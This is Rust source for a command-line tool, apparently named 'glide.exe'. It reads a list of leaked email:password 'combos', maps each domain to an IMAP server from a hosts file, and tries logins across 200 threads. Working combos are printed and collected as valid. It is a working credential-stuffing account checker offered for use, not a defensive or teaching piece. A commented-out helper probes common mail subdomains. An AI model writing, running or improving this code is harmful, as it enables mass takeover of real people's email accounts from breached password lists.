use std::{
    env,
    fs::{self, File},
    io::{self, BufRead},
    path::Path,
    time::Duration,
    thread
};
use colored::Colorize;
use sinner::Sin;
use threadpool::ThreadPool;

fn valid_mail(mail: &str, password: &str, server: &str, port: u16) -> imap::error::Result<Option<String>> {
    let client = imap::ClientBuilder::new(server, port)
        .native_tls()?;

    let mut imap_session = client
        .login(mail, password)
        .map_err(|e| e.0)?;

    imap_session.logout().unwrap();
    Ok(Some("OK".to_string()))
}

fn main_worker(input: &String, output: &String, resume: bool) {
    let input_path = Path::new(input);
    if !input_path.exists() {
        println!("{}", "Input file does not exist".red());
        return
    }

    let output_path = Path::new(output);
    let output_file = File::create(output_path)
        .expect("Failed to create Output file".red().trim());

    let hosts: Sin<Vec<(String, String, u16)>> = Sin::new(init_hosts());
    if hosts.is_empty() {
        println!("{}", "Hostがありません".red());
        return
    }

    let mut start_line: usize = 0;
    if resume {
        start_line = find_last_line();
    }

    let pool = ThreadPool::new(200);
    let mut valid: Sin<Vec<String>> = Sin::new(vec![]);
    let mut invalid: Sin<Vec<String>> = Sin::new(vec![]);

    if let Ok(lines) = read_lines(input_path) {
        println!("Loaded combos: {}", read_lines(input_path).unwrap().count());

        for (i, line) in lines.enumerate() {
            if i < start_line { continue }
            if let Ok(combo) = line {
                pool.execute(move || {
                    let split: Vec<&str> = combo.split(":").collect();
                    let mail = split.get(0).unwrap();
                    let password = split.get(1).unwrap();

                    let mail_split: Vec<&str> = mail.split("@").collect();
                    let mut found: (String, String, u16) = hosts.iter().find(|(host, _server, _port)|
                        host.eq(mail_split.get(1).unwrap()))
                        .cloned().unwrap_or(("".to_string(), "".to_string(), 0));
                    if found.0.is_empty() {
                        println!("Invalid host: {}", mail_split.get(1).unwrap());
                        // found = find_unknown_host(mail_split.get(1).unwrap()).unwrap();
                        invalid.push(combo);
                        return
                    }

                    let (_, server, port) = found;
                    if valid_mail(mail, password, &server, port).is_ok() {
                        println!("{}", format!("Valid: {}", combo).green());
                        valid.push(combo);
                    } else {
                        println!("{}", format!("Invalid: {}", combo).bright_red());
                        invalid.push(combo);
                    }
                });
            }

            thread::sleep(Duration::from_millis(10));
        }
    }

    loop { if pool.active_count() <= 0 { break } }
    println!("Valid: {}, Invalid: {}", valid.len(), invalid.len());
}

fn find_last_line() -> usize {
    let line_log = Path::new("last_line.txt");
    if !line_log.exists() { return 0 }
    if let Ok(line) = fs::read_to_string(line_log) {
        return line.parse().unwrap()
    }
    return 0
}

// fn find_unknown_host(domain: &str) -> Result<(String, String, u16), ()> {
//     let subs = ["imap", "mail", "imap-mail", "inbound", "mx", "imaps", "smtp", "m"];
//     for sub in subs {
//         let full = format!("{}.{}", sub, domain);
//         let client = imap::ClientBuilder::new(full.to_owned(), 993)
//             .native_tls().unwrap();
//
//         let error = client
//             .login("mail", "pass")
//             .unwrap_err();
//         return Ok((domain.to_string(), full.to_owned(), 993))
//     }
//     return Err(())
// }

fn init_hosts() -> Vec<(String, String, u16)> {
    let mut hosts: Vec<(String, String, u16)> = vec![];
    let path = Path::new("hosts.txt");
    if !path.exists() { return hosts }
    if let Ok(lines) = read_lines(path) {
        for line in lines {
            if let Ok(host) = line {
                let split: Vec<&str> = host.split(":").collect();
                if split.len() < 3 { continue }
                hosts.push((
                    split.get(0).unwrap().to_string(),
                    split.get(1).unwrap().to_string(),
                    split.get(2).unwrap().parse().unwrap()
                ));
            }
        }
    }
    return hosts
}

// https://doc.rust-lang.org/rust-by-example/std_misc/file/read_lines.html
fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>> where P: AsRef<Path>, {
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

#[tokio::main]
async fn main() {
    let args_c: Vec<String> = env::args().collect();

    let input = args_c.get(1);
    if input.is_none() {
        println!("{}", "No input".red());
        print_usage();
        return
    }

    let output = args_c.get(2);
    if output.is_none() {
        println!("{}", "No output".red());
        print_usage();
        return
    }

    let resume = !env::args().find(|p| p.eq("--resume")).is_none();
    main_worker(input.unwrap(), output.unwrap(), resume);
}

fn print_usage() {
    println!("glide.exe <input> <output> ...");
    println!(" --resume : Resume from the middle.");
}
